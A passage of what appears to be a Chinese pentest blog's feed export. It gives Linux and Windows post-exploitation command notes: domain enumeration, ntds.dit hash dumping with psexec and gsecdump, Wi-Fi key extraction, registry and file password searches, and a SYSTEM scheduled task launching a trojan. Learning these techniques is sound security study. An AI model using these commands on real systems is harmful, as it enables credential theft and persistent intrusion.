class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dhcp3/</span>dhclient.lea<br>cat <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/logs/</span>access_log<br>cat <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/logs/</span>access.log<br>cat <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/logs/</span>error_log<br>cat <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/logs/</span>error.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access_log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>error_log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>error.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache/</span>access_log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache/</span>access.log<br>cat <span class="hljs-regexp">/var/</span>log/auth.log<br>cat <span class="hljs-regexp">/var/</span>log/chttp.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/cups/</span>error_log<br>cat <span class="hljs-regexp">/var/</span>log/dpkg.log<br>cat <span class="hljs-regexp">/var/</span>log/faillog<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access_log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>error_log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>error.log<br>cat <span class="hljs-regexp">/var/</span>log/lastlog<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/lighttpd/</span>access.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/lighttpd/</span>error.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/lighttpd/</span>lighttpd.access.log<br>cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/lighttpd/</span>lighttpd.error.log<br>cat <span class="hljs-regexp">/var/</span>log/messages<br>cat <span class="hljs-regexp">/var/</span>log/secure<br>cat <span class="hljs-regexp">/var/</span>log/syslog<br>cat <span class="hljs-regexp">/var/</span>log/wtmp<br>cat <span class="hljs-regexp">/var/</span>log/xferlog<br>cat <span class="hljs-regexp">/var/</span>log/yum.log<br>cat <span class="hljs-regexp">/var/</span>run/utmp<br>cat <span class="hljs-regexp">/var/</span>webmin/miniserv.log<br>cat <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/logs/</span>access_log<br>cat <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/logs/</span>access.log<br>ls -alh <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dhcp3/</span><br>ls -alh <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/postgresql/</span><br>ls -alh <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/proftpd/</span><br>ls -alh <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/samba/</span><br></code></pre></td></tr></table></figure><h4 id="网站文件"><a href="#网站文件" class="headerlink" title="网站文件"></a>网站文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -alhR <span class="hljs-regexp">/var/</span>www/<br>ls -alhR <span class="hljs-regexp">/srv/</span>www<span class="hljs-regexp">/htdocs/</span><br>ls -alhR <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/www/</span>apache22<span class="hljs-regexp">/data/</span><br>ls -alhR <span class="hljs-regexp">/opt/</span>lampp<span class="hljs-regexp">/htdocs/</span><br>ls -alhR <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br></code></pre></td></tr></table></figure><h4 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">mount<br>df -h<br>cat <span class="hljs-regexp">/etc/</span>fstab<br></code></pre></td></tr></table></figure><h4 id="可写目录"><a href="#可写目录" class="headerlink" title="可写目录"></a>可写目录</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -writable -type d 2&gt;/</span>dev/<span class="hljs-keyword">null</span>      # 可写目录<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -222 -type d 2&gt;/</span>dev/<span class="hljs-keyword">null</span>     # 可写目录 <br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -o w -type d 2&gt;/</span>dev/<span class="hljs-keyword">null</span>     # 可写目录<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -o x -type d 2&gt;/</span>dev/<span class="hljs-keyword">null</span>     # 可执行目录<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ \( -perm -o w -perm -o x \) -type d 2&gt;/</span>dev/<span class="hljs-keyword">null</span>   # 可写可执行目录<br></code></pre></td></tr></table></figure><h2 id="0x06-准备与攻击"><a href="#0x06-准备与攻击" class="headerlink" title="0x06 准备与攻击"></a>0x06 准备与攻击</h2><h4 id="语言支持"><a href="#语言支持" class="headerlink" title="语言支持"></a>语言支持</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -name perl*<br><span class="hljs-builtin-name">find</span> / -name python*<br><span class="hljs-builtin-name">find</span> / -name gcc*<br><span class="hljs-builtin-name">find</span> / -name cc<br></code></pre></td></tr></table></figure><h4 id="上传方式"><a href="#上传方式" class="headerlink" title="上传方式"></a>上传方式</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -name wget<br><span class="hljs-builtin-name">find</span> / -name nc*<br><span class="hljs-builtin-name">find</span> / -name netcat*<br><span class="hljs-builtin-name">find</span> / -name tftp*<br><span class="hljs-builtin-name">find</span> / -name ftp<br></code></pre></td></tr></table></figure><h4 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h4><ul><li><a href="http://www.exploit-db.com/">http://www.exploit-db.com</a></li><li><a href="http://1337day.com/">http://1337day.com</a></li><li><a href="http://www.securiteam.com/">http://www.securiteam.com</a></li><li><a href="http://www.securityfocus.com/">http://www.securityfocus.com</a></li><li><a href="http://www.exploitsearch.net/">http://www.exploitsearch.net</a></li><li><a href="http://metasploit.com/modules/">http://metasploit.com/modules/</a></li><li><a href="http://securityreason.com/">http://securityreason.com</a></li><li><a href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a></li><li><a href="http://www.google.com/">http://www.google.com</a></li></ul><h4 id="编译exp"><a href="#编译exp" class="headerlink" title="编译exp"></a>编译exp</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">which gcc<br>gcc <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><h4 id="运行exp"><a href="#运行exp" class="headerlink" title="运行exp"></a>运行exp</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chmod</span> +<span class="hljs-keyword">x</span> <span class="hljs-keyword">exp</span><br>./<span class="hljs-keyword">exp</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透常用命令总结（windows）</title>
    <link href="/2018/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93%EF%BC%88windows%EF%BC%89/"/>
    <url>/2018/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93%EF%BC%88windows%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。</p><h2 id="0x01-查看域信息"><a href="#0x01-查看域信息" class="headerlink" title="0x01 查看域信息"></a>0x01 查看域信息</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">net group <span class="hljs-string">/domain</span>                        <span class="hljs-string">//</span>获得所有域用户组列表 <br>net group qq_group <span class="hljs-string">/domain</span>               <span class="hljs-string">//</span>显示域中qq_group组的成员 <br>net group qq_group <span class="hljs-string">/del</span> <span class="hljs-string">/domain</span>          <span class="hljs-string">//</span>删除域中qq_group组<br>net group qq_group qq <span class="hljs-string">/del</span> <span class="hljs-string">/domain</span>       <span class="hljs-string">//</span>删除域内qq_group 群组中的成员QQ<br>net group qq_group <span class="hljs-string">/add</span> <span class="hljs-string">/domain</span>          <span class="hljs-string">//</span>增加域中的群组<br>net group <span class="hljs-string">&quot;domain admins&quot;</span>  <span class="hljs-string">/domain</span>       <span class="hljs-string">//</span>获得域管理员列表<br>net group <span class="hljs-string">&quot;enterprise admins&quot;</span> <span class="hljs-string">/domain</span>    <span class="hljs-string">//</span>获得企业管理员列表<br>net localgroup administrators <span class="hljs-string">/domain</span>    <span class="hljs-string">//</span>获取域内置administrators组用（enterprise admins、domain admins）<br>net group <span class="hljs-string">&quot;domain controllers&quot;</span>  <span class="hljs-string">/domain</span>   <span class="hljs-string">//</span>获得域控制器列表<br>net group <span class="hljs-string">&quot;domain computers&quot;</span>  <span class="hljs-string">/domain</span>    <span class="hljs-string">//</span>获得所有域成员计算机列表<br>net user <span class="hljs-string">/domain</span>                        <span class="hljs-string">//</span>获得所有域用户列表<br>net user someuser <span class="hljs-string">/domain</span>              <span class="hljs-string">//</span>获得指定账户someuser的详细信息<br>net accounts <span class="hljs-string">/domain</span>                <span class="hljs-string">//</span>获得域密码策略设置，密码长短，错误锁定等信息<br>nei view <span class="hljs-string">/domain</span>                   <span class="hljs-string">//</span>查询有几个域, 查询域列表<br>net view <span class="hljs-string">/domain</span><span class="hljs-function">:testdomain</span>       <span class="hljs-string">//</span>查看 testdomain域中的计算机列表<br>nltest <span class="hljs-string">/domain_trusts</span>              <span class="hljs-string">//</span>获取域信任信息<br>net user domain-admin <span class="hljs-string">/domain</span>      <span class="hljs-string">//</span>查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息<br>net config Workstation         <span class="hljs-string">//</span>查询机器属于哪个域<br>net time <span class="hljs-string">/domian</span>               <span class="hljs-string">//</span>查询主域服务器的时间<br><span class="hljs-keyword">echo</span> %logonserver%              <span class="hljs-string">//</span>查看登陆到这台服务器的计算机名<br>net time  \\192.168.1.1         <span class="hljs-string">//</span>查询远程共享主机192.168.1.1的时间<br>net use \\IP\ipc$ password <span class="hljs-string">/user</span><span class="hljs-function">:username</span>@domain     <span class="hljs-string">//ipc</span>$域内连接<br>net  view  \\dc2.backlion.com         <span class="hljs-string">//</span>查看域控共享情况<br>dir \\dc2.backlion.com\SYSVOL <span class="hljs-string">/s</span> <span class="hljs-string">/a</span> &gt; sysvol.txt  <span class="hljs-string">//</span>列出sysvol日志记录<br>xcopy \\dc2.backlion.com\sysvol.txt  sysvol.txt  <span class="hljs-string">/i</span>  <span class="hljs-string">/e</span>  <span class="hljs-string">/c</span> <span class="hljs-string">//</span>远程拷贝到本地sysvol日志<br>net user  <span class="hljs-string">/domain</span>  bk  bk123                 <span class="hljs-string">//</span>修改域内用户密码，需要管理员权限<br>net  localgroup  administartors   SEZKL\backlion  <span class="hljs-string">/add</span>      <span class="hljs-string">//</span>将SEZKL域中的用户backlion添加到administrators组中<br>mstsc <span class="hljs-string">/admin</span>                 <span class="hljs-string">//</span>远程桌面登录到console会话解决hash无法抓出问题<br>gpupdate/force                  <span class="hljs-string">//</span>更新域策略<br>psexec  \\192.168.1.3  -u  administrator  -p  bk1234  -c  gsecdump.exe  -u<br>  <span class="hljs-string">//</span>从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来<br>gsecdump  -a        <span class="hljs-string">//</span>获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值<br>tasklist <span class="hljs-string">/S</span> ip <span class="hljs-string">/U</span> domain\username <span class="hljs-string">/P</span> <span class="hljs-string">/V</span>     <span class="hljs-string">//</span>查看远程计算机进程列 <br></code></pre></td></tr></table></figure><h2 id="0x02-基本命令"><a href="#0x02-基本命令" class="headerlink" title="0x02 基本命令"></a>0x02 基本命令</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">ipconfig</span>/<span class="hljs-keyword">all</span>    <span class="hljs-comment">//查看IP地址</span><br><span class="hljs-selector-tag">ipconfig</span> /<span class="hljs-selector-tag">release</span>  <span class="hljs-comment">//释放地址</span><br><span class="hljs-selector-tag">ipconfig</span> /<span class="hljs-selector-tag">renew</span> 重新获取<span class="hljs-selector-tag">Ip</span>地址<br><span class="hljs-selector-tag">whoami</span>    <span class="hljs-comment">//查询账号所属权限</span><br><span class="hljs-selector-tag">whoami</span>/<span class="hljs-keyword">all</span>  <span class="hljs-comment">//查看sid值</span><br><span class="hljs-selector-tag">systeminfo</span>  <span class="hljs-comment">//查询系统以及补丁信息</span><br><span class="hljs-selector-tag">tasklist</span> /<span class="hljs-selector-tag">svc</span>   <span class="hljs-comment">//查看进程</span><br><span class="hljs-selector-tag">taskkill</span> /<span class="hljs-selector-tag">im</span> 进程名称(cmd)  <span class="hljs-comment">//结束进程</span><br><span class="hljs-selector-tag">taskkill</span> /<span class="hljs-selector-tag">pid</span><span class="hljs-selector-attr">[进程码]</span> <span class="hljs-selector-tag">-t</span>(结束该进程) <span class="hljs-selector-tag">-f</span>(强制结束该进程以及所有子进程)<br><span class="hljs-selector-tag">wmic</span> <span class="hljs-selector-tag">qfe</span>  <span class="hljs-selector-tag">get</span> <span class="hljs-selector-tag">hotfixid</span>    <span class="hljs-comment">//查看已安装过得补丁，这个很实用</span><br><span class="hljs-selector-tag">wmic</span> <span class="hljs-selector-tag">qfe</span> <span class="hljs-selector-tag">list</span> <span class="hljs-selector-tag">full</span> /<span class="hljs-selector-tag">format</span>:<span class="hljs-selector-tag">htable</span> &gt; <span class="hljs-selector-tag">hotfixes</span><span class="hljs-selector-class">.htm</span>  <span class="hljs-comment">//详细的补丁安装</span><br><span class="hljs-selector-tag">wmic</span>  <span class="hljs-selector-tag">qfe</span>      <span class="hljs-comment">//查询补丁信息以及微软提供的下载地址</span><br><span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">hostname</span>(主机名）   <span class="hljs-comment">//显示该机器名的IP </span><br>net start   <span class="hljs-comment">//查看当前运行的服务</span><br>net user      <span class="hljs-comment">//查看本地组的用户</span><br>net localhroup administrators   <span class="hljs-comment">//查看本机管理员组有哪些用户</span><br>net use      <span class="hljs-comment">//查看会话</span><br>net session     <span class="hljs-comment">//查看当前会话</span><br>net share       <span class="hljs-comment">//查看SMB指向的路径[即共享]</span><br>wmic share get name,path   <span class="hljs-comment">//查看SMB指向的路径</span><br>wmic nteventlog get path,filename,writeable <span class="hljs-comment">//查询系统日志文件存储位置</span><br>net use \\IP\ipc$  password  /<span class="hljs-attribute">user</span>:username      <span class="hljs-comment">//建立IPC会话（工作组模式）</span><br>net use  <span class="hljs-attribute">z</span>:  \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>      <span class="hljs-comment">//建立映射到本机Z盘</span><br>net time \\<span class="hljs-number">172.16</span>.<span class="hljs-number">16.2</span>        <span class="hljs-comment">//查询共享主机的是</span><br>at \\<span class="hljs-number">172.16</span>.<span class="hljs-number">16.2</span> <span class="hljs-number">13</span>:<span class="hljs-number">50</span> <span class="hljs-attribute">c</span>:\windows\<span class="hljs-number">2009</span>.exe      <span class="hljs-comment">//在共享主机上执行</span><br>netstat  -ano      <span class="hljs-comment">//查看开放的端口</span><br>netstat -an | find “<span class="hljs-number">3389</span>”   <span class="hljs-comment">//找到3389端口</span><br>net accounts      <span class="hljs-comment">//查看本地密码策略</span><br>nbtstat –A ip      <span class="hljs-comment">//netbiso查询</span><br>net view      <span class="hljs-comment">//查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</span><br>echo %PROCESSOR_ARCHITECTURE%         <span class="hljs-comment">//查看系统是32还是64位  </span><br>set                              <span class="hljs-comment">//查看系统环境设置变量</span><br>net start                     <span class="hljs-comment">//查看当前运行的服务</span><br>wmic service list brief              <span class="hljs-comment">//查看进程服务</span><br>wmic process list brief         <span class="hljs-comment">//查看进程</span><br>wmic startup list brief       <span class="hljs-comment">//查看启动程序信息</span><br>wmic product list brief            <span class="hljs-comment">//查看安装程序和版本信息（漏洞利用线索）</span><br>wmic startup list full         <span class="hljs-comment">//识别开机启动的程序</span><br>wmic process where(description=<span class="hljs-string">&quot;mysqld.exe&quot;</span>) &gt;&gt; mysql.log  <span class="hljs-comment">//获取软件安装路径</span><br><br>for /f <span class="hljs-string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i in (<span class="hljs-string">&#x27;netsh wlan show profiles&#x27;</span>) do <span class="hljs-variable">@echo</span> %j | findstr -i -v echo | netsh wlan show profiles %j key=clear<br> <span class="hljs-comment">//一键获取wifi密码</span><br><br> if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) <br><span class="hljs-comment">//查看是否支持posershell</span><br><br>qwinsta                       <span class="hljs-comment">//查看登录情况</span><br><br>schtasks.exe  /Create /RU <span class="hljs-string">&quot;SYSTEM&quot;</span> /SC MINUTE /MO <span class="hljs-number">45</span> /TN FIREWALL /TR <span class="hljs-string">&quot;c:/muma.ex    e&quot;</span> /ED <span class="hljs-number">2017</span>/<span class="hljs-number">4</span>/<span class="hljs-number">7</span>  <span class="hljs-comment">//添加计划任务</span><br><br><br>set KB2829361=MS13-<span class="hljs-number">046</span>&amp;set KB2830290=MS13-<span class="hljs-number">046</span>&amp;set KB2667440=MS12-<span class="hljs-number">020</span>&amp;set KB2667402=MS12-<span class="hljs-number">020</span>&amp;set KB3124280=MS16-<span class="hljs-number">016</span>&amp;set KB3077657=MS15-<span class="hljs-number">077</span>&amp;set KB3045171=MS15-<span class="hljs-number">051</span>&amp;set KB2592799=MS11-<span class="hljs-number">080</span>&amp;set KB952004=MS09-<span class="hljs-number">012</span> PR&amp;set KB956572=MS09-<span class="hljs-number">012</span> 巴西烤肉&amp;set KB970483=MS09-<span class="hljs-number">020</span> iis6&amp;set KB2124261=MS10-<span class="hljs-number">065</span> ii7&amp;set KB2271195=MS10-<span class="hljs-number">065</span> ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do <span class="hljs-variable">@type</span> a.txt|<span class="hljs-variable">@find</span> /i <span class="hljs-string">&quot;%i&quot;</span>||<span class="hljs-variable">@echo</span> %%i% <span class="hljs-keyword">Not</span> Installed!)&amp;del /f /q /a a.txt<br> <span class="hljs-comment">//windows未打补丁情况</span><br><br> REG query HKCU  /v <span class="hljs-string">&quot;pwd&quot;</span> /s  <span class="hljs-comment">//获取保存到注册表中的密码 </span><br></code></pre></td></tr></table></figure><h2 id="0x03-内网网络结构"><a href="#0x03-内网网络结构" class="headerlink" title=" 0x03 内网网络结构"></a> 0x03 内网网络结构</h2> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <span class="hljs-attribute">tracert</span> IP    //路由跟踪<br><span class="hljs-attribute">route</span> print    //打印路由表<br><span class="hljs-attribute">arp</span> -a          //列出本网段内所有活跃的IP地址<br><span class="hljs-attribute">arp</span> -s （ip + mac）//绑定mac与ip地址<br><span class="hljs-attribute">arp</span> -d （ip + mac） //解绑mac与ip地址<br><span class="hljs-attribute">nbtscan</span> -r <span class="hljs-number">192.168.16.0</span>/<span class="hljs-number">24</span>      //通过小工具nbtscan扫描整个网络<br><span class="hljs-attribute">netsh</span> firewall show config     //查看防火墙策略<br><span class="hljs-attribute">netsh</span> firewall show state     //查看防火墙策略<br><span class="hljs-attribute">for</span> /l %i in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">255</span>) do @ping <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.%i -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> | find /i <span class="hljs-string">&quot;ttl&quot;</span>   //批量扫描内网存活主机<br><br><span class="hljs-attribute">windows</span>自带端口转发：<br><span class="hljs-attribute">netsh</span> interface ipv<span class="hljs-number">6</span> install  //首先安装IPV<span class="hljs-number">6</span>（xp、<span class="hljs-number">2003</span>下IPV<span class="hljs-number">6</span>必须安装，否则端口转发不可用！）<br><span class="hljs-attribute">netsh</span> interface portproxy add v<span class="hljs-number">4</span>tov<span class="hljs-number">4</span> listenaddress=<span class="hljs-number">0.0.0.0</span> listenport=<span class="hljs-number">22</span> connectaddress=<span class="hljs-number">1.1.1.1</span> connectport=<span class="hljs-number">22</span>  //将本机<span class="hljs-number">22</span>到<span class="hljs-number">1.1.1.1</span>的<span class="hljs-number">22</span><br><span class="hljs-attribute">netsh</span> interface portproxy add v<span class="hljs-number">4</span>tov<span class="hljs-number">4</span> listenaddress=<span class="hljs-number">192.168.193.1</span> listenport=<span class="hljs-number">22</span> connectaddress=<span class="hljs-number">8.8.8.8</span> connectport=<span class="hljs-number">22</span><br><span class="hljs-attribute">netsh</span> interface portproxy add v<span class="hljs-number">4</span>tov<span class="hljs-number">4</span> listenaddress=<span class="hljs-number">192.168.193.1</span> listenport=<span class="hljs-number">22</span> connectaddress=www.baidu.com connectport=<span class="hljs-number">22</span><br><span class="hljs-attribute">netsh</span> interface portproxy show <span class="hljs-literal">all</span> // 查看转发配置<br><span class="hljs-attribute">netsh</span> interface portproxy delete v<span class="hljs-number">4</span>tov<span class="hljs-number">4</span> listenaddress=<span class="hljs-number">0.0.0.0</span> listenport=<span class="hljs-number">22</span> //删除配置<br><span class="hljs-attribute">netsh</span> firewall set portopening protocol=tcp port=<span class="hljs-number">22</span> name=Forward mode=enable scope=<span class="hljs-literal">all</span> profile=<span class="hljs-literal">all</span>  //添加防火墙规则，允许连接<span class="hljs-number">22</span>： <br></code></pre></td></tr></table></figure><p>0x04 敏感数据</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dir <span class="hljs-string">/b/s</span> config.*              <span class="hljs-string">//</span>查看所在目录所有config.为前缀的文件<br>findstr <span class="hljs-string">/si</span> password *<span class="hljs-string">.xml</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span>     <span class="hljs-string">//</span>查看后缀名文件中含有password关键字的文件<br>findstr <span class="hljs-string">/si</span> login *<span class="hljs-string">.xml</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span>     <span class="hljs-string">//</span>查看后缀名文件中含有login关键字的文件<br>copy con 创建命令：<br>copy con  ftp.bat     <span class="hljs-string">//</span>创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功<br>copy con  test.vbs    <span class="hljs-string">//</span>创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功 <br></code></pre></td></tr></table></figure><h2 id="0x05-常用快捷命令"><a href="#0x05-常用快捷命令" class="headerlink" title="0x05 常用快捷命令"></a>0x05 常用快捷命令</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mspaint　　画图工具<br>calc　　计算机<br>notepad　　记事本<br>taskmgr　　任务管理器<br>osk　　打开屏幕键盘<br>gpedit<span class="hljs-selector-class">.msc</span>　　组策略<br>services<span class="hljs-selector-class">.msc</span>　　本地服务<br>compmgmt<span class="hljs-selector-class">.msc</span>　　计算机管理<br>devmgmt<span class="hljs-selector-class">.msc</span>　　设备管理器<br>winver　　查看系统版本<br>magnify　　放大镜实用程序<br>eventvwr　　事件查看器<br>Regedit　　打开注册表<br>resmon　　资源监视器<br>WMIC BIOS get releasedate　　查看电脑生产日期<br>mstsc -f　　远程连接（可以全屏）<br></code></pre></td></tr></table></figure><h2 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h2><p>其他更多命令和详细的用法说明，可以参考官方文档</p><p><a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf">https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈XXE漏洞</title>
    <link href="/2018/05/03/%E6%B5%85%E8%B0%88XXE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/05/03/%E6%B5%85%E8%B0%88XXE%E6%BC%8F%E6%B4%9E/</url>
    
